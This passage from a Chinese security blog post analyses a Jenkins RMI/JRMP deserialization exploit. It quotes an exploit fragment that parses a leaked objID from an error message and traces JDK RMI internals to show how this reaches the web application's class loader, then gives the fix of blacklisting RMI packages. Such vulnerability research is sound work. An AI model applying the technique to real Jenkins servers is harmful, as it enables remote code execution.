<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    String var1;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isLocal) &#123;<br>        var1 = <span class="hljs-string">&quot;local&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        var1 = <span class="hljs-string">&quot;remote&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[endpoint:&quot;</span> + <span class="hljs-built_in">this</span>.ep + <span class="hljs-string">&quot;(&quot;</span> + var1 + <span class="hljs-string">&quot;),&quot;</span> + <span class="hljs-string">&quot;objID:&quot;</span> + <span class="hljs-built_in">this</span>.id + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>会将其中的 objID 打印出来。</p>
<p>接下来就是最后一步了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    c.call((Callable&lt;?, ?&gt;) o);<br>&#125;<br><span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>    <span class="hljs-comment">// [ActivationGroupImpl[UnicastServerRef [liveRef:</span><br>    <span class="hljs-comment">// [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1,</span><br>    <span class="hljs-comment">// -9046794842107247609]]</span><br><br>    System.err.println(e.getMessage());<br><br>    parseObjIdAndExploit(args, payloadClass, jrmpPort, isa, e);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>执行第二步操作并捕捉前面提到的因为调用了抽象函数抛出的异常，然后调用 parseObjIdAndExploit，解析报错信息中的 objID，然后调用 exploit，可以看到 exploit 部分其实跟 JRMPClient 差别不大，不同的地方就在于写入了前面解析出来的 objID，而不是默认的 2。</p>
<p>跟踪一下 JRMPListener 的反序列化过程，看到 Transport 类的 serviceCall 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">serviceCall</span><span class="hljs-params">(<span class="hljs-keyword">final</span> RemoteCall var1)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        ObjID var39;<br>        <span class="hljs-keyword">try</span> &#123;<br>            var39 = ObjID.read(var1.getInputStream());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var33) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, var33);<br>        &#125;<br><br>        <span class="hljs-type">Transport</span> <span class="hljs-variable">var40</span> <span class="hljs-operator">=</span> var39.equals(dgcID) ? <span class="hljs-literal">null</span> : <span class="hljs-built_in">this</span>;<br>        <span class="hljs-type">Target</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> ObjectTable.getTarget(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectEndpoint</span>(var39, var40));<br>        <span class="hljs-keyword">final</span> Remote var37;<br>        <span class="hljs-keyword">if</span> (var5 != <span class="hljs-literal">null</span> &amp;&amp; (var37 = var5.getImpl()) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Dispatcher</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.getDispatcher();<br>            var5.incrementCallCount();<br><br>            <span class="hljs-type">boolean</span> var8;<br>            <span class="hljs-keyword">try</span> &#123;<br>                transportLog.log(Log.VERBOSE, <span class="hljs-string">&quot;call dispatcher&quot;</span>);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">AccessControlContext</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var5.getAccessControlContext();<br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var41</span> <span class="hljs-operator">=</span> var5.getContextClassLoader();<br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    setContextClassLoader(var41);<br>                    currentTransport.set(<span class="hljs-built_in">this</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;<br>                            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                                Transport.<span class="hljs-built_in">this</span>.checkAcceptPermission(var7);<br>                                var6.dispatch(var37, var1);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                            &#125;<br>                        &#125;, var7);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                    &#125; <br>                    ...<br>                &#125; <br>                ...<br>            &#125; <br>            ...<br>        &#125;<br><br>        ...<br>    &#125; <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，这里反序列化出 ObjID 后，会根据 ObjID 从 ObjectTable 取出 Target 对象，然后再从 Target 对象中取出 ClassLoader 并设置为当前环境下的 classLoader。</p>
<p>而调试可以得知，当使用默认的 objID 时，其 classLoader 为 AppClassLoader，其加载路径为启动命令、系统属性等 classpath，而 Jenkins 的 commons-collections 包是放在 lib 目录下的，也就是说要用 WebAppClassLoader 才能加载到，所以就会因为无法加载类而导致利用失败。</p>
<p>而在 JRMPListener payload 反序列化过程中，会调用 UnicastServerRef 类的 exportObject 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">exportObject</span><span class="hljs-params">(Remote var1, Object var2, <span class="hljs-type">boolean</span> var3)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var1.getClass();<br><br>    Remote var5;<br>    <span class="hljs-keyword">try</span> &#123;<br>        var5 = Util.createProxy(var4, <span class="hljs-built_in">this</span>.getClientRef(), <span class="hljs-built_in">this</span>.forceStubUse);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var7) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExportException</span>(<span class="hljs-string">&quot;remote object implements illegal remote interface&quot;</span>, var7);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (var5 <span class="hljs-keyword">instanceof</span> RemoteStub) &#123;<br>        <span class="hljs-built_in">this</span>.setSkeleton(var1);<br>    &#125;<br><br>    <span class="hljs-type">Target</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Target</span>(var1, <span class="hljs-built_in">this</span>, var5, <span class="hljs-built_in">this</span>.ref.getObjID(), var3);<br>    <span class="hljs-built_in">this</span>.ref.exportObject(var6);<br>    <span class="hljs-built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);<br>    <span class="hljs-keyword">return</span> var5;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>他会生成一个新的 Target，用自身 ref 属性（即 LiveRef）中的 objID 进行标识，并通过 putTarget 将其放入 ObjectTable 中。所以我们通过报错获取 LiveRef 中的 objID 后，就可以通过该 objID 在反序列化时获取相应 Target 中的 WebAppClassLoader。</p>
<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>将 rmi 相关的包放入黑名单。</p>
<hr>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/articles/web/242764.html">安全研究 | Jenkins漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/6361">Jenkins RCE漏洞分析汇总</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/" class="print-no-link">#Web</a>
      
        <a href="/tags/Jenkins/" class="print-no-link">#Jenkins</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Jenkins相关漏洞学习（一）</div>
      <div>http://yoursite.com/2020/11/24/Jenkins相关漏洞学习（一）/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Aluvion</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2020年11月24日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/11/25/Jenkins%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" title="Jenkins相关漏洞学习（二）">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Jenkins相关漏洞学习（二）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%A7%82%E6%B5%8B/" title="Tomcat源码观测">
                        <span class="hidden-mobile">Tomcat源码观测</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
